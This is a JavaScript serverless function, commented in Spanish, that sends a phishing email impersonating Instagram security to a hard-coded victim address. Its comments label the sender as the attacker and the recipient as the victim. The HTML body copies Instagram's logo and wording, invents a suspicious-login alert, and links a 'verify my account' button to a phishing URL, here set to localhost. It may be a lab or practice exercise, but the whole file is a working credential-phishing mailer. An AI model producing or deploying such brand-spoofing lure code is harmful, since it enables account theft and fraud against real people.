const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Método no permitido' };
  }

  // URL local
  const phishingUrl = 'http://localhost:3000';
  const targetEmail = 'jvab065@gmail.com'; // Email fijo de la víctima

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'jvab5899@gmail.com', // Email del atacante
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: '"Seguridad de Instagram" <jvab5899@gmail.com>',
    to: targetEmail,
    subject: 'Alerta de seguridad: Actividad sospechosa detectada',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="margin: 20px 0;">
        <h2>Actividad sospechosa detectada</h2>
        <p>Hola,</p>
        <p>Hemos detectado un intento de inicio de sesión sospechoso en tu cuenta de Instagram desde una nueva ubicación:</p>
        <ul style="color: #666;">
          <li>Fecha: ${new Date().toLocaleString()}</li>
          <li>Ubicación: Madrid, España</li>
          <li>Dispositivo: iPhone</li>
        </ul>
        <p>Si no fuiste tú, por favor verifica tu cuenta inmediatamente:</p>
        <div style="margin: 30px 0;">
          <a href="${phishingUrl}" 
             style="background-color: #0095f6; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold;">
            Verificar mi cuenta
          </a>
        </div>
        <p style="color: #666; font-size: 12px;">
          Si no realizaste esta acción, ignora este correo. 
          <br>Para más información sobre la seguridad de tu cuenta, visita el Centro de ayuda.
        </p>
        <hr style="margin: 20px 0; border: none; border-top: 1px solid #eee;">
        <p style="color: #666; font-size: 12px;">© Instagram from Meta</p>
      </div>
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      body: JSON.stringify({ 
        message: 'Email enviado exitosamente',
        sentTo: targetEmail 
      })
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Error al enviar el email' })
    };
  }
}; 